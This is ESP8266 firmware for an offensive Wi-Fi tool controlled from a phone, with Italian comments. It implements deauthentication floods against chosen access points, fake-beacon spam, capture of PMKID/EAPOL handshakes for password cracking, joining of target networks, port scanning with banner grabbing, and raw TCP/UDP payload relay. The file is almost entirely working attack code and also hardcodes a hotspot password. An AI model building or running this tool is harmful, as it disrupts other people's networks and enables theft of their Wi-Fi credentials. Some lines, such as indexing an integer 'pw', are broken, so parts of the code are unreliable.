// RedHatSec Bridge 8266 v3 — STA-only, active scan async, TX buffered
//
//   iPhone --TCP:3333--> ESP8266 (STA su hotspot iPhone)
//
//   Protocollo RHS (frame TX esp→app):
//     [0x5A][len_lo][len_hi][cmd][status][payload...][crc8(off1, 4+len)]
//
//   Protocollo RHS (frame RX app→esp):
//     [0xA5][len_lo][len_hi][rsvd][cmd][payload...][crc8(off1, 4+len)]
//
//   Cmd:
//     0x01 ping                         → "RHS-8266"
//     0x02 scan[sec]                    → [rssi][ch][bssid6][sec][ssidlen][ssid]*
//     0x04 deauth[mac6][ch][count]      → "deauth ok"
//     0x05 beacon[count][len][ssid]...  → armato (loop in background)
//     0x06 pmkid[mac6][ch]              → EAPOL raw (max 128B) o "no eapol"
//     0x07 stop                         → ferma beacon + pmkid
//
// Note: ogni operazione che cambia canale (deauth, beacon, pmkid) spezza
// momentaneamente lo STA. Il risultato viene bufferizzato e consegnato
// al primo client TCP che si riconnette.

#include <ESP8266WiFi.h>
#include <user_interface.h>

// ============ CONFIG ============
const char *STA_SSID = "Hexxeted";      // hotspot personale iPhone
const char *STA_PASS = "lwae9180";    // ← cambia
const uint16_t TCP_PORT = 3333;

// ============ STATO ============
WiFiServer server(TCP_PORT);
WiFiClient client;

uint8_t apChannel = 1;

uint8_t rxBuf[512];
int rxLen = 0;

uint8_t txBuf[1100];
int txLen = 0;
bool txPending = false;

bool scanPending = false;
uint32_t scanStart = 0;
bool joinPending = false;
uint32_t joinStart = 0;

bool beaconActive = false;
uint8_t beaconSsids[16][33];
int beaconSsidLens[16];
int beaconCount = 0;
uint8_t beaconChannel = 6;

bool pmkidArmed = false;
uint32_t pmkidStart = 0;
uint32_t pmkidReturnAt = 0;
bool pmkidAwaitingReturn = false;
uint8_t pmkidTarget[6];
uint8_t pmkidTargetCh = 1;
uint8_t pmkidBuf[128];
int pmkidLen = 0;
bool pmkidCaptured = false;

struct APEntry { uint8_t bssid[6]; uint8_t ch; int8_t rssi; char ssid[33]; uint8_t sec; };
APEntry aps[24];
int apCount = 0;

// ============ crc8 ============
uint8_t crc8(const uint8_t *d, int n) {
  uint8_t crc = 0;
  for (int i = 0; i < n; i++) {
    crc ^= d[i];
    for (int b = 0; b < 8; b++)
      crc = (crc & 0x80) ? (uint8_t)((crc << 1) ^ 0x07) : (uint8_t)(crc << 1);
  }
  return crc;
}

// ============ TX con buffer offline ============
void sendFrame(uint8_t cmdEcho, uint8_t status, const uint8_t *payload, int len) {
  uint8_t f[1024];
  int i = 0;
  f[i++] = 0x5A;
  f[i++] = len & 0xFF;
  f[i++] = (len >> 8) & 0xFF;
  f[i++] = cmdEcho;
  f[i++] = status;
  if (len > 1000) len = 1000;
  if (len > 0) { memcpy(f + i, payload, len); i += len; }
  f[i++] = crc8(f + 1, 4 + len);

  if (client && client.connected()) {
    client.write(f, i);
    client.flush();
  } else {
    if (i <= (int)sizeof(txBuf)) {
      memcpy(txBuf, f, i);
      txLen = i;
      txPending = true;
    }
  }
  Serial.printf("[TX] cmd=0x%02X st=0x%02X len=%d%s\n",
                cmdEcho, status, len, (client && client.connected()) ? "" : " (buffered)");
}

// ============ PMKID sniffer ============
void snifferCb(uint8_t *buf, uint16_t len) {
  if (!pmkidArmed || len < 40) return;
  uint8_t *d = buf;
  int lim = (len > 160) ? 160 : len;
  for (int i = 0; i + 8 <= lim; i++) {
    if (d[i] == 0xAA && d[i+1] == 0xAA && d[i+2] == 0x03 && d[i+3] == 0x00 &&
        d[i+4] == 0x00 && d[i+5] == 0x00 && d[i+6] == 0x88 && d[i+7] == 0x8E) {
      bool match = false;
      for (int a = 4; a + 6 <= 36 && a + 6 <= len; a++)
        if (memcmp(d + a, pmkidTarget, 6) == 0) { match = true; break; }
      if (!match) return;
      pmkidLen = (len < 128) ? len : 128;
      memcpy(pmkidBuf, d, pmkidLen);
      pmkidCaptured = true;
      Serial.println("[pmkid] EAPOL");
      return;
    }
  }
}

// ============ TX raw 802.11 ============
void sendDeauth(const uint8_t bssid[6], uint8_t ch, int count) {
  wifi_set_channel(ch);
  delay(5);

  uint8_t pkt[26];
  pkt[0] = 0xC0; pkt[1] = 0x00;
  pkt[2] = 0x00; pkt[3] = 0x00;
  for (int k = 0; k < 6; k++) pkt[4 + k] = 0xFF;
  memcpy(pkt + 10, bssid, 6);
  memcpy(pkt + 16, bssid, 6);
  pkt[22] = 0xF0; pkt[23] = 0xFF;
  pkt[24] = 0x07; pkt[25] = 0x00;
  for (int n = 0; n < count; n++) {
    wifi_send_pkt_freedom(pkt, 26, false);
    delay(8);
  }

  wifi_set_channel(apChannel);
  Serial.printf("[deauth] %02X:%02X:%02X:%02X:%02X:%02X ch%d x%d\n",
                bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], ch, count);
}

void buildBeacon(uint8_t *pkt, int *len, const uint8_t *ssid, int ssidLen,
                 const uint8_t bssid[6], uint8_t ch) {
  int i = 0;
  pkt[i++] = 0x80; pkt[i++] = 0x00;
  pkt[i++] = 0x00; pkt[i++] = 0x00;
  for (int k = 0; k < 6; k++) pkt[i++] = 0xFF;
  memcpy(pkt + i, bssid, 6); i += 6;
  memcpy(pkt + i, bssid, 6); i += 6;
  pkt[i++] = 0x00; pkt[i++] = 0x00;
  for (int k = 0; k < 8; k++) pkt[i++] = 0x00;
  pkt[i++] = 0x64; pkt[i++] = 0x00;
  pkt[i++] = 0x01; pkt[i++] = 0x04;
  pkt[i++] = 0x00; pkt[i++] = (uint8_t)ssidLen;
  memcpy(pkt + i, ssid, ssidLen); i += ssidLen;
  pkt[i++] = 0x01; pkt[i++] = 0x08;
  const uint8_t rates[8] = {0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C};
  memcpy(pkt + i, rates, 8); i += 8;
  pkt[i++] = 0x03; pkt[i++] = 0x01; pkt[i++] = ch;
  *len = i;
}

void beaconLoop() {
  uint8_t pkt[128];
  for (int n = 0; n < beaconCount && beaconActive; n++) {
    uint8_t bssid[6] = {0x02, (uint8_t)random(256), (uint8_t)random(256),
                        (uint8_t)random(256), (uint8_t)random(256), (uint8_t)random(256)};
    int len = 0;
    buildBeacon(pkt, &len, beaconSsids[n], beaconSsidLens[n], bssid, beaconChannel);
    for (int rep = 0; rep < 3; rep++) wifi_send_pkt_freedom(pkt, len, false);
    delay(40);
  }
}

// ============ scan ============
void startScan(int seconds) {
  if (seconds < 3) seconds = 3;
  if (seconds > 12) seconds = 12;
  if (scanPending) return;
  WiFi.scanDelete();
  if (WiFi.scanNetworks(true, true) == WIFI_SCAN_RUNNING) {
    scanPending = true;
    scanStart = millis();
    Serial.println("[scan] started async");
  }
}

void pollScan() {
  if (!scanPending) return;
  int n = WiFi.scanComplete();
  if (n == WIFI_SCAN_RUNNING) {
    if (millis() - scanStart > 15000) {
      scanPending = false;
      WiFi.scanDelete();
      sendFrame(0x02, 0x02, (const uint8_t *)"scan timeout", 12);
    }
    return;
  }
  scanPending = false;
  apCount = 0;
  if (n > 0) {
    for (int k = 0; k < n && apCount < 24; k++) {
      APEntry &e = aps[apCount];
      memset(&e, 0, sizeof(e));
      e.rssi = (int8_t)WiFi.RSSI(k);
      e.ch   = (uint8_t)WiFi.channel(k);
      const uint8_t *b = WiFi.BSSID(k);
      if (b) memcpy(e.bssid, b, 6);
      e.sec  = (uint8_t)WiFi.encryptionType(k);
      String s = WiFi.SSID(k);
      int sl = s.length(); if (sl > 32) sl = 32;
      memcpy(e.ssid, s.c_str(), sl); e.ssid[sl] = 0;
      apCount++;
    }
  }
  WiFi.scanDelete();

  uint8_t payload[900];
  int i = 0;
  for (int k = 0; k < apCount && i < 880; k++) {
    payload[i++] = (uint8_t)aps[k].rssi;
    payload[i++] = aps[k].ch;
    memcpy(payload + i, aps[k].bssid, 6); i += 6;
    payload[i++] = aps[k].sec;
    int sl = strlen(aps[k].ssid);
    if (sl > 32) sl = 32;
    payload[i++] = (uint8_t)sl;
    memcpy(payload + i, aps[k].ssid, sl); i += sl;
  }
  Serial.printf("[scan] %d AP\n", apCount);
  sendFrame(0x02, 0x00, payload, i);
}

// ============ RX parser ============
void dispatchCmd(uint8_t cmd, const uint8_t *pl, int plen);

void feedRx(const uint8_t *d, int n) {
  for (int i = 0; i < n; i++) {
    if (rxLen == 0 && d[i] != 0xA5) continue;
    if (rxLen < (int)sizeof(rxBuf)) rxBuf[rxLen++] = d[i];
    if (rxLen >= 6) {
      int plen = rxBuf[1] | (rxBuf[2] << 8);
      int total = 6 + plen;
      if (rxLen >= total) {
        uint8_t cmd = rxBuf[4];
        if (crc8(rxBuf + 1, 4 + plen) == rxBuf[5 + plen]) {
          dispatchCmd(cmd, rxBuf + 5, plen);
        } else {
          sendFrame(cmd, 0x01, (const uint8_t *)"crcerr", 6);
        }
        rxLen = 0;
      }
    }
  }
}

// ============ dispatcher ============
void dispatchCmd(uint8_t cmd, const uint8_t *pl, int plen) {
  Serial.printf("[RX] cmd=0x%02X plen=%d\n", cmd, plen);
  switch (cmd) {
    case 0x01:
      sendFrame(0x01, 0x00, (const uint8_t *)"RHS-8266", 8);
      break;

    case 0x02: {
      int seconds = plen > 0 ? pl[0] : 8;
      startScan(seconds);
      break;
    }

    case 0x04:
      if (plen >= 8) {
        sendDeauth(pl, pl[6], pl[7]);
        sendFrame(0x04, 0x00, (const uint8_t *)"deauth ok", 9);
      } else {
        sendFrame(0x04, 0x02, (const uint8_t *)"bad args", 8);
      }
      break;

    case 0x05: {
      int p = 0;
      int cnt = plen > 0 ? pl[p++] : 0;
      if (cnt > 16) cnt = 16;
      beaconCount = 0;
      for (int k = 0; k < cnt && p < plen; k++) {
        int sl = pl[p++];
        if (p + sl > plen || sl > 32) break;
        memcpy(beaconSsids[beaconCount], pl + p, sl);
        beaconSsidLens[beaconCount] = sl;
        beaconCount++;
        p += sl;
      }
      if (beaconCount > 0) {
        wifi_set_channel(beaconChannel);
        beaconActive = true;
        Serial.printf("[beacon] armato x%d ch%d\n", beaconCount, beaconChannel);
        sendFrame(0x05, 0x00, (const uint8_t *)"armed", 5);
      } else {
        sendFrame(0x05, 0x02, (const uint8_t *)"bad args", 8);
      }
      break;
    }

    case 0x06:
      if (plen >= 7) {
        memcpy(pmkidTarget, pl, 6);
        pmkidTargetCh = pl[6];
        pmkidCaptured = false;
        pmkidLen = 0;
        pmkidArmed = true;
        pmkidStart = millis();
        wifi_set_channel(pmkidTargetCh);
        delay(5);
        wifi_promiscuous_enable(1);
        Serial.printf("[pmkid] armed %02X:%02X:%02X:%02X:%02X:%02X ch%d\n",
                      pmkidTarget[0], pmkidTarget[1], pmkidTarget[2],
                      pmkidTarget[3], pmkidTarget[4], pmkidTarget[5], pmkidTargetCh);
      } else {
        sendFrame(0x06, 0x02, (const uint8_t *)"bad args", 8);
      }
      break;

    case 0x07:
      if (beaconActive) {
        beaconActive = false;
        wifi_set_channel(apChannel);
      }
      if (pmkidArmed) {
        pmkidArmed = false;
        wifi_promiscuous_enable(0);
        wifi_set_channel(apChannel);
      }
      sendFrame(0x07, 0x00, (const uint8_t *)"stopped", 7);
      break;

    case 0x08: {  // join(ssidLen,ssid,passLen,pass) — STA verso la rete target, AP resta attivo
      int p = 0;
      if (plen < 2) { sendFrame(0x08, 0x02, (const uint8_t *)"bad args", 8); break; }
      int sl = pl[p++];
      if (p + sl > plen) { sendFrame(0x08, 0x02, (const uint8_t *)"bad args", 8); break; }
      char ssid[33]; memcpy(ssid, pl + p, sl); ssid[sl] = 0; p += sl;
      if (p >= plen) { sendFrame(0x08, 0x02, (const uint8_t *)"bad args", 8); break; }
      int pw = pl[p++];
      if (p + pw > plen) { sendFrame(0x08, 0x02, (const uint8_t *)"bad args", 8); break; }
      char pass[65]; memcpy(pass, pl + p, pw); pass[pw] = 0;
      wifi_promiscuous_enable(0);
      WiFi.mode(WIFI_AP_STA);
      WiFi.begin(ssid, pw[0] ? pass : NULL);
      joinPending = true;
      joinStart = millis();
      Serial.printf("[join] %s\n", ssid);
      break;
    }

    case 0x10: {  // tcp_scan(ip4, count, port u16 LE xN) → [port u16 LE][bannerLen][banner]...
      IPAddress ip(pl[0], pl[1], pl[2], pl[3]);
      int cnt = pl[4];
      if (cnt > 12) cnt = 12;
      uint8_t out[160];
      int oi = 0;
      uint32_t t0 = millis();
      for (int k = 0; k < cnt && millis() - t0 < 12000 && oi < 150; k++) {
        uint16_t port = pl[5 + k * 2] | (pl[6 + k * 2] << 8);
        WiFiClient c;
        if (c.connect(ip, port)) {
          out[oi++] = port & 0xFF;
          out[oi++] = port >> 8;
          int blIdx = oi++;
          delay(250);
          int bl = 0;
          while (c.available() && bl < 40) { out[oi++] = c.read(); bl++; }
          out[blIdx] = (uint8_t)bl;
          c.stop();
        }
      }
      sendFrame(0x10, 0x00, out, oi);
      break;
    }

    case 0x11: {  // tcp_roundtrip(ip4, port u16, timeout_cs, plen u16, payload) → bytes
      IPAddress ip(pl[0], pl[1], pl[2], pl[3]);
      uint16_t port = pl[4] | (pl[5] << 8);
      int tcs = pl[6];
      int plen = pl[7] | (pl[8] << 8);
      WiFiClient c;
      if (!c.connect(ip, port)) {
        sendFrame(0x11, 0x01, (const uint8_t *)"conn fail", 9);
        break;
      }
      c.write(pl + 9, plen);
      uint8_t resp[512];
      int rl = 0;
      uint32_t t0 = millis();
      while (millis() - t0 < (uint32_t)tcs * 100 && rl < 512) {
        while (c.available() && rl < 512) resp[rl++] = c.read();
        delay(15);
      }
      c.stop();
      sendFrame(0x11, 0x00, resp, rl);
      break;
    }

    case 0x12: {  // udp_roundtrip(ip4, port u16, timeout_cs, plen u16, payload) → bytes
      IPAddress ip(pl[0], pl[1], pl[2], pl[3]);
      uint16_t port = pl[4] | (pl[5] << 8);
      int tcs = pl[6];
      int plen = pl[7] | (pl[8] << 8);
      WiFiUDP u;
      u.beginPacket(ip, port);
      u.write(pl + 9, plen);
      u.endPacket();
      uint8_t resp[512];
      int rl = 0;
      uint32_t t0 = millis();
      while (millis() - t0 < (uint32_t)tcs * 100) {
        int ps = u.parsePacket();
        if (ps > 0) {
          while (u.available() && rl < 512) resp[rl++] = u.read();
          break;
        }
        delay(20);
      }
      u.stop();
      sendFrame(0x12, rl > 0 ? 0x00 : 0x01, resp, rl);
      break;
    }

    default:
      sendFrame(cmd, 0x03, (const uint8_t *)"unknown cmd", 11);
  }
}

// ============ setup ============
void setup() {
  Serial.begin(115200);
  Serial.setDebugOutput(false);
  pinMode(2, OUTPUT);
  digitalWrite(2, LOW);

  WiFi.mode(WIFI_STA);
  WiFi.setAutoReconnect(true);
  WiFi.begin(STA_SSID, STA_PASS);
  Serial.printf("[STA] connecting to %s\n", STA_SSID);

  uint32_t t0 = millis();
  while (WiFi.status() != WL_CONNECTED && millis() - t0 < 30000) delay(200);

  if (WiFi.status() == WL_CONNECTED) {
    apChannel = WiFi.channel();
    Serial.printf("[STA] ok ip=%s ch=%d\n",
                  WiFi.localIP().toString().c_str(), apChannel);
  } else {
    Serial.println("[STA] FAIL — il bridge parte lo stesso, ma TCP non raggiungibile");
  }

  wifi_set_promiscuous_rx_cb(snifferCb);
  // promiscuo spento di default — si accende solo durante PMKID

  server.begin();
  server.setNoDelay(true);
  Serial.printf("[RHS-8266 v3] TCP :%u pronto\n", TCP_PORT);
}

// ============ loop ============
void loop() {
  // client TCP
  if (!client || !client.connected()) {
    if (client) client.stop();
    client = server.available();
    if (client) {
      client.setNoDelay(true);
      Serial.printf("[bridge] client %s\n", client.remoteIP().toString().c_str());
      if (txPending) {
        client.write(txBuf, txLen);
        client.flush();
        txPending = false;
        Serial.printf("[bridge] flush %d byte bufferizzati\n", txLen);
      }
    }
  }

  // RX
  int avail;
  while (client && client.connected() && (avail = client.available()) > 0) {
    uint8_t buf[128];
    int n = client.read(buf, sizeof(buf));
    if (n > 0) feedRx(buf, n);
  }

  // scan async
  pollScan();

  // join rete target (STA) — risposta asincrona
  if (joinPending) {
    if (WiFi.status() == WL_CONNECTED) {
      joinPending = false;
      apChannel = WiFi.channel();
      String ips = WiFi.localIP().toString();
      sendFrame(0x08, 0x00, (const uint8_t *)ips.c_str(), ips.length());
    } else if (millis() - joinStart > 15000) {
      joinPending = false;
      sendFrame(0x08, 0x02, (const uint8_t *)"join failed", 11);
    }
  }

  // beacon spam
  if (beaconActive) beaconLoop();

  // PMKID: timeout / capture → hop back
  if (pmkidArmed && (pmkidCaptured || millis() - pmkidStart > 25000)) {
    pmkidArmed = false;
    wifi_promiscuous_enable(0);
    wifi_set_channel(apChannel);
    pmkidReturnAt = millis() + 3000;
    pmkidAwaitingReturn = true;
    Serial.println("[pmkid] return to AP channel");
  }

  if (pmkidAwaitingReturn && millis() >= pmkidReturnAt) {
    pmkidAwaitingReturn = false;
    if (pmkidCaptured) sendFrame(0x06, 0x00, pmkidBuf, pmkidLen);
    else              sendFrame(0x06, 0x02, (const uint8_t *)"no eapol", 8);
  }

  // LED
  if (client && client.connected()) {
    digitalWrite(2, LOW);
  } else {
    digitalWrite(2, (millis() / 600) % 2 ? LOW : HIGH);
  }

  delay(1);
}